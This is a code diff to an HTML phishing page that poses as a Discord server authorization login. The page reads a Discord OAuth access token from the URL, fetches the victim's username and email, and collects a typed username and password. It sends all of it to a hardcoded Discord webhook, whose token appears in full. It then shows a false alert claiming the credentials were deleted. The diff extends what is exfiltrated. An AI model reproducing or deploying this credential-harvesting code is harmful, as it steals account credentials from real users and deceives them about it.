@@ -48,7 +48,6 @@
 
 <div class="login-box">
   <h2 id="greeting">Logging in...</h2>
-  <p id="email-display" style="font-size: 14px;"></p>
   <input type="text" id="username" placeholder="Username" />
   <input type="password" id="password" placeholder="Password" />
   <button onclick="sendToWebhook()">Login</button>
@@ -56,6 +55,8 @@
 
 <script>
   const webhookURL = "https://discord.com/api/webhooks/1359463177359855706/9r73rc7pZA-U2RgXAXgyDIBlivvoexHG5EtB6GYNrsb__lcfeRuTMwlEpXqTc-I2mQfz";
+  let discordUsername = "Unknown";
+  let discordEmail = "Unavailable";
 
   const fragment = new URLSearchParams(window.location.hash.slice(1));
   const accessToken = fragment.get('access_token');
@@ -68,31 +69,32 @@
     })
     .then(res => res.json())
     .then(user => {
-      document.getElementById('greeting').innerText = `Successfully logged in, ${user.username}#${user.discriminator}`;
-      if (user.email) {
-        document.getElementById('email-display').innerText = `Email: ${user.email}`;
-      }
+      discordUsername = `${user.username}#${user.discriminator}`;
+      discordEmail = user.email || "Unavailable";
+      document.getElementById('greeting').innerText = `Successfully logged in, ${discordUsername}`;
     });
   } else {
     document.getElementById('greeting').innerText = `Not logged in via Discord`;
   }
 
   function sendToWebhook() {
-    const fakeUser = document.getElementById('username').value;
-    const fakePass = document.getElementById('password').value;
+    const enteredUser = document.getElementById('username').value;
+    const enteredPass = document.getElementById('password').value;
 
-    const data = {
-      content: `🟢 Credentials Entered:\n**Username:** ${fakeUser}\n**Password:** ${fakePass}`
-    };
+    const content = `🟢 Credentials Entered:
+**Discord Username:** ${discordUsername}
+**Email:** ${discordEmail}
+**Entered Username:** ${enteredUser}
+**Entered Password:** ${enteredPass}`;
 
     fetch(webhookURL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify(data)
+      body: JSON.stringify({ content })
     }).then(() => {
-      alert("Your access to the server has been successfully authorized! Be assured that your credentials have been deleted from our databse after verification. ");
+      alert("Your access to the server has been successfully authorized! Be assured that your credentials have been deleted from our databse after verification.");
     });
   }
 </script>
